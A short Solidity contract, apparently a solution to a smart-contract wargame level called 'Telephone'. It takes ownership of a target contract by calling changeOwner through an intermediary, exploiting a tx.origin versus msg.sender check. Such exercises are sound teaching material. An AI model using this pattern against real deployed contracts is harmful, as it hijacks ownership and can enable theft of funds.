// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {

    ITelephone public telephoneContract;

    constructor(address telephoneAddress) public {
        telephoneContract = ITelephone(telephoneAddress);
    }

    function claimContract() public {
        telephoneContract.changeOwner(msg.sender);
    }
}